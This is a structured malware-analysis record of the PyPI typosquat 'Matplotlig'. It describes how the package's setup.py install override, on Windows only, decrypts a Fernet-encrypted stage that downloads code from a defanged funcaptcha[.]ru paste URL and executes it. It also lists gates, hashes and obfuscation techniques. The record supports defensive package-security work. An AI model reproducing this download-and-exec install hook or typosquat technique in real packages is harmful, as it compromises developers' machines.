# pypi Matplotlig@1.0.0

**Source:** pypi_malregistry · **Source label:** malicious · **Released:** not found · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

Matplotlig is a typosquat of matplotlib whose setup.py overrides the setuptools `install` command, so the override's `run` executes on a normal pip install of the sdist. Inside it, one gate checks `os.name == "nt"`. On Windows the code execs a Fernet-encrypted string (key is a literal next to it) which decrypts to a `requests.get` of a paste URL on funcaptcha[.]ru and an `exec` of the response text. Opening the gate needs only a Windows install environment plus network access to that host; elsewhere the package installs with no extra behaviour.

## Execution

- **cmdclass** `cmdclass[install] = mabrNrzVtMJIyzhxWbKKXmVtoLrCgXFWJFxmqSrilpCWJbNDWOPhQUNLZgysCKuRRrBSxHIwiMkvkwTJzycnSPcjPjfsnjXHaLKCoMADNfEGICdivKCoVJiIQgushry`: runs setup.py; direct_script, decoded_eval, download_then_exec.
- **setup_py** `python setup.py (pip install from sdist)`: runs setup.py; direct_script.

## Gates

| gate | hook | expression | branch | min | behaviours | recipe |
|---|---|---|---|---|---|---|
| g1 | cmdclass | c1 (c1: os == nt) | then | 1 | download, exec_downloaded | os=win32 |

Gate intent: g1 activate/enables/targeting

Grounding: 1 of 1 conditions and 1 of 1 gates from the candidate set.

## Requirements

- network: funcaptcha[.]ru:443 (second stage is fetched over HTTPS with requests.get and exec'd; the install raises if the host is unreachable)
- other: fernet and requests importable (setup_requires) (the gated block imports requests and fernet before running the fetched code)

## Behaviour

- Ungated: none
- Gated: download, exec_downloaded

## Notes

- The Fernet layer was decrypted with the existing `fernet_exec` decoder (derived d1); conditions and sinks for the stage are cited in the decoded copy.
- The second stage is remote and was not fetched, so any gates inside it are not recorded.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "pypi",
    "name": "Matplotlig",
    "version": "1.0.0",
    "archive_sha256": "f2cac3f07288cd836140354d1844fd0a185385ff912799213918cb6bc4760523",
    "source_dataset": "pypi_malregistry",
    "source_label": "malicious",
    "released_at": null,
    "released_at_source": null,
    "sample_path": "pypi_malregistry/pypi/malicious_intent/matplotlig-1.0.0.tar.gz",
    "package_root": "layer0/Matplotlig-1.0.0",
    "cluster_key": "5c460456752dba84055e5ef71e26f7a5b809682df364b0de7ed4a08e2cc7f365",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "cmdclass",
        "command": "cmdclass[install] = mabrNrzVtMJIyzhxWbKKXmVtoLrCgXFWJFxmqSrilpCWJbNDWOPhQUNLZgysCKuRRrBSxHIwiMkvkwTJzycnSPcjPjfsnjXHaLKCoMADNfEGICdivKCoVJiIQgushry",
        "runs_on": "always",
        "file_chain": [
          "setup.py"
        ],
        "interpreter": "python",
        "launch_style": [
          "direct_script",
          "decoded_eval",
          "download_then_exec"
        ],
        "silent_failure": false
      },
      {
        "hook": "setup_py",
        "command": "python setup.py (pip install from sdist)",
        "runs_on": "always",
        "file_chain": [
          "setup.py"
        ],
        "interpreter": "python",
        "launch_style": [
          "direct_script"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "setup_requires (dependency tree): ['fernet', 'requests']",
      "setup.py (only install-reached file, 1.5 KB): read in full; the Fernet token in the install override was decrypted with the registered fernet_exec decoder (derived d1, key is a literal at the call site); nothing unread.",
      "Decoded stage: exec(requests.get(<funcaptcha paste URL with package name>).text with <pre> tags stripped). The fetched second stage is not in the package and was not retrieved, so its own gates are unknown.",
      "setup_py hook: top-level code only defines the install override and calls setup(); no behaviour of its own. Classifier 'Operating System :: Microsoft :: Windows' is descriptive and not enforced by pip."
    ]
  },
  "requirements": [
    {
      "axis": "network",
      "value": "funcaptcha[.]ru:443",
      "reason": "second stage is fetched over HTTPS with requests.get and exec'd; the install raises if the host is unreachable"
    },
    {
      "axis": "other",
      "value": "fernet and requests importable (setup_requires)",
      "reason": "the gated block imports requests and fernet before running the fetched code"
    }
  ],
  "conditions": [
    {
      "id": "c1",
      "category": "os",
      "api": "os.name",
      "operator": "==",
      "value": "nt",
      "value_recovered": "plain",
      "in_scope": true,
      "sites": [
        {
          "candidate": "k_314857e349",
          "anchor": {
            "file": "setup.py",
            "derived_from": null,
            "start_byte": 546,
            "end_byte": 561,
            "node_type": "comparison_operator",
            "sha256": "03f6fcec9e8705f1",
            "line": 13
          }
        }
      ],
      "provenance": "in_set"
    }
  ],
  "gates": [
    {
      "gate_id": "g1",
      "hook": "cmdclass",
      "expression": "c1",
      "guards": [
        {
          "candidate": "q_9879a474ea",
          "site": {
            "file": "setup.py",
            "derived_from": null,
            "start_byte": 543,
            "end_byte": 975,
            "node_type": "if_statement",
            "sha256": "416a66c1cb9621b1",
            "line": 13
          },
          "kind": "if",
          "arm": "then",
          "conditions": [
            "c1"
          ]
        }
      ],
      "provenance": "in_set",
      "polarity": "activate",
      "effect": "enables",
      "purpose": "targeting",
      "purpose_reason": "The download-and-exec stage only exists for Windows (os.name == 'nt'); other platforms just run the normal install.",
      "then": {
        "min_conditions": 1,
        "behaviours": [
          "download",
          "exec_downloaded"
        ],
        "env_recipe": {
          "os": "win32"
        },
        "recipe_guessed_fields": [],
        "regions": [
          {
            "file": "setup.py",
            "derived_from": null,
            "start_byte": 579,
            "end_byte": 975,
            "node_type": "block",
            "sha256": "594c7856e4e2830c",
            "line": 14
          },
          {
            "file": "setup.py",
            "derived_from": "d1",
            "start_byte": 579,
            "end_byte": 768,
            "node_type": "stmt_range",
            "sha256": "b1097250f43f6bb4",
            "line": 14
          }
        ],
        "payload": [
          {
            "behaviour": "download",
            "sink_kind": "network",
            "sink": {
              "file": "setup.py",
              "derived_from": "d1",
              "start_byte": 658,
              "end_byte": 721,
              "node_type": "call",
              "sha256": "8f29bb5fb7ab68ed",
              "line": 16
            },
            "witness": []
          },
          {
            "behaviour": "exec_downloaded",
            "sink_kind": "eval",
            "sink": {
              "file": "setup.py",
              "derived_from": "d1",
              "start_byte": 653,
              "end_byte": 768,
              "node_type": "call",
              "sha256": "29483fae2d080fb9",
              "line": 16
            },
            "witness": []
          }
        ]
      },
      "else": null
    }
  ],
  "behaviours": {
    "ungated": [],
    "gated": [
      "download",
      "exec_downloaded"
    ]
  },
  "obfuscation": {
    "level": "light",
    "techniques": [
      "Fernet-encrypted stage with key literal at the call site",
      "exec of decrypted code",
      "exec of remotely fetched code",
      "random-string class name, description and author fields"
    ],
    "decoded": true,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://funcaptcha[.]ru/paste2?package=Matplotlig",
        "role": "second_stage"
      }
    ]
  },
  "attack_type": "typosquat",
  "family_hint": "funcaptcha fernet dropper",
  "claude_assessment": "malicious",
  "assessment_reason": "The install override decrypts a Fernet blob that, on Windows only, downloads code from a remote paste endpoint and executes it during pip install. The name is a typosquat of matplotlib.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [
      {
        "id": "d1",
        "recipe": "decode_spec",
        "recipe_version": 1,
        "input": {
          "file": "setup.py",
          "derived_from": null
        },
        "params": {
          "decoder": "fernet_exec",
          "lang": "py"
        },
        "output_sha256": "fbb7e756046ca5fb"
      }
    ],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "dda089324015776f"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 1,
    "condition_sites_cited": 1,
    "guards_cited": 1,
    "candidates_dropped": 0,
    "conditions_in_set": 1,
    "conditions_out_of_set": 0,
    "guard_candidates": 1,
    "gates_in_set": 1,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
